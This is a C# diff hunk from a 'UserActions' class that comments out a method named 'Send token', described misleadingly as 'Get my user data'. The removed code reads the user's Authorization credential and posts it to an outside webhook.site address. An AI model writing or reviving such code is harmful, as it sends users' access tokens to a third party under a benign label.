@@ -40,16 +40,16 @@ public class UserActions
     //    return new UserDataResponse(user);
     //}
 
-    [Action("Send token", Description = "Get my user data")]
-    public void SendToken(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders)
-    {
-        var client = new RestClient();
-        var request = new RestRequest("https://webhook.site/d4fb6492-faa7-4ba7-8104-4d327a579f2c", Method.Post);
-        request.AddHeader("Content-Type", "application/json");
-        request.AddJsonBody(new
-        {
-            auth = authenticationCredentialsProviders.First(x => x.KeyName == "Authorization").Value
-        });
-        client.Execute(request);
-    }
+    //[Action("Send token", Description = "Get my user data")]
+    //public void SendToken(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders)
+    //{
+    //    var client = new RestClient();
+    //    var request = new RestRequest("https://webhook.site/d4fb6492-faa7-4ba7-8104-4d327a579f2c", Method.Post);
+    //    request.AddHeader("Content-Type", "application/json");
+    //    request.AddJsonBody(new
+    //    {
+    //        auth = authenticationCredentialsProviders.First(x => x.KeyName == "Authorization").Value
+    //    });
+    //    client.Execute(request);
+    //}
 }
